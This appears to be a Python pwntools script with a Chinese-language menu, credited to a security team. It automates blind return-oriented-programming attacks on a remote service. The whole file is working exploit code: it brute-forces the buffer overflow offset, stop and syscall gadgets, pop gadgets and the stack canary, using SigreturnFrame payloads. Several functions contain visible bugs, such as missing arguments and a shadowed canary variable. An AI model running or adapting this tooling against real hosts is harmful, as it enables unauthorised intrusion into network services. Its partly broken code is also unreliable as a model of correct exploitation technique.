from pwn import *
from multiprocessing import Process
context(log_level ='DEBUG')
context.arch = 'amd64'


def IPport(ip,port):
	try:
		p = remote(ip,int(port))
		p.close()
	except:
		print('\033[1;31;36m'"输入有误")
		return "wrong"
	return "ok"

def help():
	a='''
	1、设置ip和端口
	2、爆破溢出长度
	3、单个字节爆破
	4、寻找ret
	5、寻找syscall
	6、寻找libc_csu_init
	
	输入show，查看内容
	'''
	print(a)

def fuzz(v,ip,port,until=b'',want=b''):
	try:
		# print(v,ip,port,until,want,sep="-----------")
		s=remote(ip.strip("\n"),int(port.strip("\n")))
		#s = process('./TNT')
		s.recvuntil(until)
		s.send(v)
		r = b''
		#r = s.recv()
		a = s.recv(timeout=1)
		while a:
			r = r + a
			a = s.recv(timeout=1)
		s.close()
		if (want is not None and want in r) or (want is None and len(r)>0):
			return "normal"
		else:
			return "stop"
	except EOFError:
		s.close()
		return "crash"
	return None
	
def text(prefix,ip,port,want,until):
	stop_gadget = []
	j = 1
	stop_temp_gadget = []
	for i in range(256):
		t = prefix + bytes([i])
		c = fuzz(t,ip,port,until,want)
		if c != "crash":
			if c == 'stop':
				stop_gadget.append(i.to_bytes(1,byteorder='little'))
	while j < 3:	
		for stop in stop_gadget:
			for i in range(256):
				t = prefix + stop + bytes([i])
				c = fuzz(t,ip,port,until,want)
				if c != "crash":
					print(stop+i.to_bytes(1,byteorder='little'), c)
					if c == 'stop':
						stop_temp_gadget.append(stop+i.to_bytes(1,byteorder='little'))
		stop_gadget = []
		for i in stop_temp_gadget:
			stop_gadget.append(i)
		stop_temp_gadget = []
		j = j + 1
	print(stop_gadget)
	return stop_gadget

def overflow(ip,port,flag='',until=b''):
	for i in range(255):
		try:
			p=remote(ip.strip("\n"),int(port.strip("\n")))
			#p = process('./TNT')
			p.recvuntil(until)
			p.sendline(b"a"*i)
			res = p.recvrepeat(timeout=1)
			i+=1
			print(res)
		#print(flag.strip("\n").encode())
			if flag.strip("\n").encode() in res:
				p.close()
				continue
			else:
				p.close()
				print('\033[1;31;31m'"长度为：",i-1)
				return i-1
				break
		except EOFError:
			p.close()
			print('\033[1;31;31m'"长度为：",i)
			return i
			# p.close()
			break
		#sleep(1)


def find_syscall(ip,port,offset,target,until,stop,want):
    try:
        sh = remote(ip.strip("\n"),int(port.strip("\n")))
        #sh = process('./TNT')
        frame = SigreturnFrame()
        frame.rax = 1
        frame.rdi = 1
        frame.rsi = target
        frame.rdx = 0x10
        frame.rip = target
        if canary == b'':
            payload = b'a'*offset + p64(stop) + p64(target) + bytes(frame)
        else:
            payload = b'a'*offset + canary + p64(stop) + p64(target) + bytes(frame)
        sh.sendlineafter(until,payload)
        sleep(1)
        r = b''
        sh.send(b'a'*15)
        a = sh.recv(timeout=1)
        while a:
            r = r + a
            a = sh.recv(timeout=1)
        print(r)
        if r.startswith(b'\x0f\x05'):
            sh.close()
            return 'syscall'
        else:
            sh.close()
            return 'wrong'
    except EOFError:
        print(r)
        if r.startswith(b'\x0f\x05'):
            sh.close()
            return 'syscall'
        sh.close()
        return 'crash'



def findret(nl,over,prefix,ip,port,want,until):
	a=input("输入系统位数：1、32   2、64\n")
	print(over + bytes([12]) + p32(u32(nl)>>8)[:-1] +prefix)
	if "1" in a:
		for i in range(256):
			t = over + bytes([i]) + p32(u32(nl)>>8)[:-1] +prefix
			c = fuzz(t,ip,port,until,want)
			if c != "crash":
				print(hex(i), c)

	else:
		for i in range(256):
			t = over + bytes([i]) + p64(u64(nl)>>8)[:-1] +prefix
			c = fuzz(t,ip,port,until,want)
			if c != "crash":
				print(hex(i), c)

#@annot.meta(
#    desc="stop and syscall",
#    params=[annot.Param("ip", "ip"),annot.Param("port", "port"),annot.Param("want", "want"),annot.Param("until", #"until"),annot.Param("flag", "flag"),],
#    cats=[Attck.Reconnaissance],
#)
	


def stop_syscall(ip,port,want,until,stop_gadget,flag):
	offset = overflow(ip,port,flag,until)
	prefix = b'a'*offset
	if canary:
		prefix = prefix + canary
	available_stop = []
	stop_gadget = text(prefix,ip,port,bytes(flag,encoding='utf-8'),until)
	print(stop_gadget)
	print(offset)
	syscall_gadget = []
	stop_gadget_1 = stop_gadget
	for stop in stop_gadget:
		stop_int = int.from_bytes(stop,'little')
		for target in stop_gadget_1: 
			target_int = int.from_bytes(target,'little')
			ret = find_syscall(ip,port,offset,target_int,until,stop_int,want)
			if ret == 'syscall':
				syscall_gadget.append(hex(target_int))
				available_stop.append(hex(stop_int))
	print(syscall_gadget)
	return syscall_gadget

def GetPopGadgets(ip,port,offset,stop,until,flag):
	addr = 0x400000
	while addr < 0x40FFFF:
		try:
			io = remote(ip.strip("\n"),int(port.strip("\n")))
			io.recvuntil(until)
			if canary == b'':
				payload = b'A'*offset + p64(addr) + p64(1)*6 + p64(stop)
			else:
				payload = b'A'*offset + canary + p64(addr) + p64(1)*6 + p64(stop)
			io.sendline(payload)
			output = io.recvall(timeout=1)
			print(output)
			io.close()
			if flag in output:
				try:
					io = remote(ip.strip("\n"),int(port.strip("\n")))
					io.recvuntil(until)
					#如果是第一种情况，此payload会出现异常
					if canary == b'':
						payload = b'A'*offset + p64(addr) + p64(1)*6
					else:
						payload = b'A'*offset + canary + p64(addr) + p64(1)*6
					io.sendline(payload)
					out = b''
					output = io.recv(timeout=1)
					while output:
						out = out + output
						output = io.recv(timeout=1)
					io.close()
					addr += 1
				#出现异常，则说明前面的addr没问题
				except:
					io.close()
					return addr
			else:
				addr = addr + 1
		#当try中，由于addr的地址不对应时，发生溢出。地址+1，继续循环。
		except:
			addr += 1
			continue

def canary(bit,start,ip,port,overflow):
    p = remote(ip.strip("\n"),int(port.strip("\n")))
    canary = b'\x00'
    if bit == 64:
        for i in range(bit / 8 - 1):
            for i in range(256):
                p.send(b'a' * overflow + canary + chr(i).encode('latin1'))
                a = p.recvall(timeout=1)
                if start in a:
                    canary += chr(i).encode('latin1')
                    break

    else:
        for i in range(bit / 8 - 1):
            for i in range(256):
                p.send(b'a' * overflow + canary + chr(i).encode('latin1'))
                a = p.recvall(timeout=1)
                if start in a:
                    canary += chr(i).encode('latin1')
                    break
    return canary

def main():
	mark,ip,port,flag,hexit,until,prefix,stop = str(),str(),str(),str(),str(),str(),str(),str()
	offset = 0
	start = b''
	import sys
	a = '''
	
		
	█╗
	██╗
	█╔╝     作者：星盟安全团队
	█║        
	
		'''
	print('\033[1;31;31m''{0}'.format(a))
	syscall_gadget = []
	help()
	while True:
		choice_it = input('\033[1;31;33m'"\n{0}>>>选择：\n".format(mark))
		if choice_it.strip("\n") == str(1):
			b="{0}>>>输入ip：\n".format(mark)
			print('\033[1;31;33m''\n{0}'.format(b),end='')
			ip=input()
			b="{0}>>>输入port：\n".format(mark)
			print('\033[1;31;33m''\n{0}'.format(b),end='')
			port=input()
			mark=ip.strip("\n")+":"+port.strip("\n")
			p = IPport(ip.strip("\n"),port.strip("\n"))
		elif choice_it.strip("\n") == str(2):
			b="{0}>>>填写输入后的标示位(使用默认值则回车)：\n".format(mark)
			print('\033[1;31;33m''\n{0}'.format(b),end='')
			flag1=input()
			if "" is flag1.strip("\n"):
				flag=flag
			else:
				flag=flag1
			b="{0}>>>填写输入前的标示位：\n".format(mark)
			print('\033[1;31;33m''\n{0}'.format(b),end='')
			until1=input()
			if "" is until1.strip("\n"):
				until=until
			else:
				until1=until1.replace("\\n",'\n')
				until=until1
			#print(until.replace("\n",'').encode())
			overflow(ip,port,flag,until.replace("\n",'',1).encode())
		elif choice_it.strip("\n") == str(3):
			b="{0}>>>填写垃圾数据长度(使用默认值则回车)：\n".format(mark)
			print('\033[1;31;33m''\n{0}'.format(b),end='')
			prefix1=input()
			if "" is prefix1.strip("\n"):
				prefix=prefix
			else:
				prefix=prefix1
			
			b="{0}>>>填写输入后的标示位(使用默认值则回车)：\n".format(mark)
			print('\033[1;31;33m''\n{0}'.format(b),end='')
			flag1=input()
			if "" is flag1.strip("\n"):
				flag=flag
			else:
				flag=flag1
			
			b="{0}>>>填写输入前的标示位(使用默认值则回车)：\n".format(mark)
			print('\033[1;31;33m''\n{0}'.format(b),end='')
			until1=input()
			if "" is until1.strip("\n"):
				until=until
			else:
				until1=until1.replace("\\n",'\n')
				until=until1
			
			#print(until.replace("\n",'').encode())
			b="{0}>>>填写溢出后需要爆破的16进制数，格式：“\\x0a\\x33”（不需要则不填写）：\n".format(mark)
			print('\033[1;31;33m''\n{0}'.format(b),end='')
			hexit=input()
			hexit=hexit.replace("\n",'')
			#hexit=hexit.replace("\\x",'0x')
			longtxt=hexit.split("\\x")
			longtxt.pop(0)
			hexitb = bytes()
			for i in range(len(longtxt)):
				longtxt[i] = "0x" + longtxt[i]
				hexitb += bytes([int(longtxt[i],16)])
			context.log_level = "critical"
			print('\033[1;31;31m'"正在爆破中请等待一会儿。。。。。。")
			#多进程开启
			# text(int(prefix)*b"a"+hexitb,ip,port,flag.strip("\n").encode(),until.replace("\n",'',1).encode())
			p1 = Process(target=text, args=(int(prefix)*b"a"+hexitb,ip,port,flag.strip("\n").encode(),until.replace("\n",'',1).encode(),))
			p1.start()
			p1.join()
		elif choice_it.strip("\n") == str(4):
			b="{0}>>>输入normal的地址，格式(大端)：“\\x0a\\x33\\x04\\x08”：\n".format(mark)
			print('\033[1;31;33m''\n{0}'.format(b),end='')
			stop1=input()
			if "" is stop1.strip("\n"):
				stop=stop
			else:
				stop=stop1.replace("\n",'')
			stoptxt=stop.split("\\x")
			stoptxt.pop(0)
			hexitbstop = bytes()
			for i in range(len(stoptxt)):
				stoptxt[i] = "0x" + stoptxt[i]
				hexitbstop += bytes([int(stoptxt[i],16)])
			
			b="{0}>>>填写垃圾数据长度(使用默认值则回车)：\n".format(mark)
			print('\033[1;31;33m''\n{0}'.format(b),end='')
			prefix1=input()
			if "" is prefix1.strip("\n"):
				prefix=prefix
			else:
				prefix=prefix1
				
			b="{0}>>>填写输入后的标示位(使用默认值则回车)：\n".format(mark)
			print('\033[1;31;33m''\n{0}'.format(b),end='')
			flag1=input()
			if "" is flag1.strip("\n"):
				flag=flag
			else:
				flag=flag1
			
			b="{0}>>>填写输入前的标示位(使用默认值则回车)：\n".format(mark)
			print('\033[1;31;33m''\n{0}'.format(b),end='')
			until1=input()
			if "" is until1.strip("\n"):
				until=until
			else:
				until1=until1.replace("\\n",'\n')
				until=until1
		
			# print(until.replace("\n",'').encode())
			hexitb=hexitbstop
			context.log_level = "critical"
			print('\033[1;31;31m'"正在爆破中请等待一会儿。。。。。。")
			#多进程开启
			# text(int(prefix)*b"a"+hexitb,ip,port,flag.strip("\n").encode(),until.replace("\n",'',1).encode())
			p1 = Process(target=findret(hexitb,int(prefix)*b"a",hexitbstop,ip,port,flag.strip("\n").encode(),until.replace("\n",'',1).encode(),))
			p1.start()
			p1.join()
		elif choice_it.strip("\n") == str(5):
			b = "{0}>>>填写 输出前标识 程序起始标识 输入后标识：\n".format(mark)
			print('\033[1;31;33m''\n{0}'.format(b),end='')
			until1 = input()
			flag1=input()
			want1 = input()
			if "" is until1.strip("\n"):
				until=until
			else:
				until1=until1.replace("\\n",'\n')
				until=until1
			if "" is want1.strip("\n"):
				want=want
			else:
				want1=want1.replace("\\n",'\n')
				want=want1
			if "" is flag1.strip("\n"):
				flag=flag
			else:
				flag1=flag1.replace("\\n",'\n')
				flag=flag1
			stop_syscall(ip,port,want,until,flag)
		elif choice_it.strip("\n") == str(6):
			b = "{0}>>>填写 输出前标识 程序起始标识 输入后标识：\n".format(mark)
			print('\033[1;31;33m''\n{0}'.format(b),end='')
			until = input()
			if "" is until1.strip("\n"):
				until=until
			else:
				until1=until1.replace("\\n",'\n')
				until=until1
			want = input()
			if "" is want1.strip("\n"):
				want=want
			else:
				want1=want1.replace("\\n",'\n')
				want=want1
			flag1=input()
			if "" is flag1.strip("\n"):
				flag=flag
			else:
				flag1=flag1.replace("\\n",'\n')
				flag=flag1
			offset1 = input()
			if "" is offset.strip("\n"):
				offset = overflow(ip,port,flag,until)
			else:
				offset1=offset1.replace("\\n",'\n')
				offset=offset1
			stop1=input()
			if "" is stop1.strip("\n"):
				prefix = b'a'*offset
				stop=text(prefix,ip,port,bytes(flag,encoding='utf-8'),until)
			else:
				stop=stop1.replace("\n",'')
				stoptxt=stop.split("\\x")
				stoptxt.pop(0)
				hexitbstop = bytes()
				for i in range(len(stoptxt)):
					stoptxt[i] = "0x" + stoptxt[i]
					hexitbstop += bytes([int(stoptxt[i],16)])
				stop = hexitbstop
			pop = GetPopGadgets(ip,port,offset,stop,until,bytes(want,encoding='utf-8'))
			print(pop)
		elif choice_it.strip("\n") == str(7):
			b = "{0}>>>填写 程序位数 起始标识 ：\n".format(mark)
			print('\033[1;31;33m''\n{0}'.format(b),end='')
			bit1 = input()
			if "" is bit1.strip("\n"):
				bit=bit
			else:
				bit1=bit1.replace("\\n",'\n')
				bit=bit1
			start1=input()
			if "" is start1.strip("\n"):
				start=start
			else:
				start1=start1.replace("\\n",'\n')
				start=start1
			canary = canary(bit,start,ip,port,offset)
		elif choice_it.strip("\n") == "show":
			print("----主机地址----\n",mark,"\n----输入后的标示位----\n",flag,"\n----溢出后需要爆破的16进制数，格式：“\\x0a\\x33”----\n",hexit,"\n----输入前的标示位----\n",until,"\n----溢出长度----\n",prefix,"\n----normal地址----\n",stop)
		else:
			print('\033[1;31;31m'"选择错误请重试")



canary = b''
main()
